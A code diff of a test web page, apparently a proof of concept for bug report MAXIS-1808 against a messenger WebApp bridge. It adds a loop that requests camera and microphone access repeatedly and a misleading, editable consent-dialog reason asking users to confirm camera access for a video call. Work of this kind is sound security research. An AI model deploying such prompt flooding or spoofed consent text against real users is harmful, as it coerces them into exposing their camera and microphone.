@@ -50,17 +50,23 @@
         console.error(err);
       }
     }
-function MaxShareFunction() {
-    window.WebApp.shareMaxContent({
-        text: "test link",
-        link: "https://google.com"
-      }).then(res => {
-      savedkey = JSON.stringify(res);
-      document.getElementById("output3").innerHTML = "<h2>shareMaxContent attempt:<br/>" + savedkey + "</h2>";
+function RequestOnce() {
+    var pm = window.WebApp.PermissionsManager;
+    var reason = document.getElementById('reason').value || undefined;
+
+    var p;
+    if (pm && typeof pm.requestAccess === 'function') {
+      // Высокий уровень: SDK сам подставит queryId (withQueryId).
+      p = Promise.resolve().then(function () { return pm.requestAccess(permsArray(), reason); });
+    } else if (WA && WA.requestController && WA.requestController.createRequest) {
+      // Низкий уровень: точная полезная нагрузка как в техспеке.
+      var permissions = permsArray().map(function (k) { return k === 'camera' ? { camera: true } : { mic: true }; });
+      p = WA.requestController.createRequest('WebAppPermissionsRequestAccess', {
+        reason: reason, permissions: permissions
+      });
+    } else {
+      return Promise.reject(new Error('bridge недоступен: нет WebApp.PermissionsManager / requestController'));
     }
-    ).catch((err)=> {
-      document.getElementById("output2").innerHTML = "<h2>shareMaxContent error:<br/>" + err + "</h2>";
-    });
   }
   function ShareFunction() {
     window.WebApp.shareContent({
@@ -108,15 +114,27 @@ function MaxShareFunction() {
 <body>
   <h2>Smile for the camera 😈</h2>
   <button onclick="capture()">Start Camera Capture with getUserMedia</button>
-  <button onclick="ShareFunction()">WebAppShare</button>
-  <button onclick="DownloadFileFunction()">WebAppDownloadFile</button>
-  <button onclick="OpenLinkFunction()">WebAppOpenLink</button>
-  <button onclick="OpenMaxLinkFunction()">WebAppOpenMaxLink</button>
-  <p id="output" style="display:inline-block;"></p>
-  <p id="output2" style="display:inline-block;"></p>
-  <p id="output3" style="display:inline-block;"></p>
-  <p id="output4" style="display:inline-block;"></p>
-  <p id="output5" style="display:inline-block;"></p>
+  <button onclick="RequestOnce()">Request Access to Camera stream</button>
+
+  <div class="card">
+  <h2>Управление</h2>
+  <button class="primary" id="btn-start">Запустить цикл requestAccess</button>
+  <button class="danger"  id="btn-stop" disabled>Остановить</button>
+  <label>Пауза между запросами, мс (0 = сразу после ответа)
+    <input type="text" id="delay" value="0" inputmode="numeric" />
+  </label>
+  <label>reason (текст в диалоге согласия — вектор L-2)
+    <input type="text" id="reason" value="[PoC MAXIS-1808] Подтвердите доступ к камере для продолжения видеосвязи" />
+  </label>
+  <label>Разрешения
+    <select id="perms">
+      <option value="camera">camera</option>
+      <option value="mic">mic</option>
+      <option value="both" selected>camera + mic</option>
+    </select>
+  </label>
+  <button class="muted" id="btn-single">Одиночный requestAccess (для сравнения)</button>
+</div>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display: none;"></canvas>
   <img id="photo" alt="Captured image will appear here">
